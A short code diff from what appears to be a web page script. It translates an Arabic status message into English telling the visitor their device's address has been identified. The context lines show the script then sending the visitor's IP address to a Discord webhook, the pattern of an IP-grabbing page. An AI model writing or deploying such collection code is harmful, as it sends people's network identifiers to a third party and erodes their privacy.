@@ -303,7 +303,7 @@
                     }
                     
                     const cleanIp = ipAddress.trim();
-                    setStatus("تم تحديد العنوان!", false, cleanIp);
+                    setStatus("Your device's address has been identified.!", false, cleanIp);
                     
                     // 2. إرسال الـ IP إلى ويب هوك ديسكورد
                     await sendIpToWebhook(cleanIp);
